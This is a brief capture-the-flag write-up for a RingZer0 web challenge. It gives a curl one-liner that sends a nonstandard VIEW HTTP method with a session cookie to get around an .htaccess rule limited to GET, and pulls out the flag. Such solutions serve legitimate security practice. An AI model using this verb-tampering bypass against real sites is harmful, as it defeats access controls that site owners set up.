# Area 51 - Challenge 48

The .htaccess seems to be blocking GET requests

Let's try other HTTP method such as VIEW

`curl -s -H "Cookie:PHPSESSID=xxxxxxxxxx" --request VIEW https://ringzer0team.com/challenges/48 | grep FLAG`
